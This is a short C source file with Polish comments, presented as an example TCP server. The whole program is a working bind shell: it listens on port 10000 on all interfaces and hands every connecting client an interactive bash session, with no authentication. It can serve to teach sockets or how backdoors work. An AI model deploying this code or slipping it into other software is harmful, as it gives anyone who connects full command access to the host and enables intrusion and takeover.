/*
   tcpsrv.c - przyklad serwera TCP

   by Marcin Dawcewicz
*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>		/* bind(), listen(), accept()      */
#include <linux/in.h>		/* struct sockaddr_in              */
#include <sys/wait.h>		/* waitpid()                       */
#include <unistd.h>		/* fork()                          */
#include <signal.h>		/* signal()                        */

#define SPORT 10000		/* port serwera                    */

void
sigchld_handler (int sig)
{
  int pid;

  while ((pid = waitpid (-1, NULL, WNOHANG)) > 0);
}

main ()
{
  int sd, cd, alen, pid;
  struct sockaddr_in saddr, caddr;

  sd = socket (PF_INET, SOCK_STREAM, 0);
  if (sd < 0)
    {
      perror ("socket()");
      exit (1);
    }

  saddr.sin_family = PF_INET;
  saddr.sin_port = htons (SPORT);
  saddr.sin_addr.s_addr = INADDR_ANY;

  if (bind (sd, (struct sockaddr *) &saddr, sizeof (saddr)))
    {
      perror ("bind()");
      exit (1);
    }

  if (listen (sd, 5))
    {
      perror ("listen()");
      exit (1);
    }

  signal (SIGCHLD, sigchld_handler);

  while (1)
    {
      alen = sizeof (saddr);
      cd = accept (sd, (struct sockaddr *) &caddr, &alen);
      if (cd < 0)
	{
	  perror ("accept()");
	  exit (1);

	}

      printf ("Polaczenie od klienta %s:%i\n", inet_ntoa (caddr.sin_addr),
	      ntohs (caddr.sin_port));

      if ((pid = fork ()) == 0)
	{
	  /* Jestesmy dzieckiem ;) */
	  dup2 (cd, 0);
	  dup2 (cd, 1);
	  dup2 (cd, 2);

	  close (sd);

	  printf ("\nProsze czekac. Uruchamiam powloke ...\n\n");

//        send (cd, "\nProsze czekac. Uruchamiam powloke ...\n\n", 40, 0);

	  if (execl ("/bin/bash", "bash", "-i", NULL) < 0)
	    {
	      perror ("execl()");
	      exit (1);
	    }
	}
      else if (pid < 0)
	{
	  perror ("fork()");
	  exit (1);
	}

      /* Jestesmy rodzicem ... */
      close (cd);
    }
}
